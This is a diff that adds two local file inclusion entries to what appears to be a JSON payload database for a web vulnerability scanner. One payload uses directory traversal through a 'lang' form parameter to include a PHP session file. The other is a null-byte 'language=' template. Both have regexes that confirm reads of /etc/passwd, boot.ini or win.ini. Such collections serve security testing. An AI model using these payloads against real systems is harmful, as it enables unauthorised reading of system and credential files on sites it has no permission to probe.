@@ -174,5 +174,27 @@
       "expected_status_code": 200,
       "success_regex": "root:.*:0:0|boot.ini"
     }
+  },
+  {
+    "payload_id": "OWP-237746",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-408288",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "language=[LFI]%00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
   }
 ]
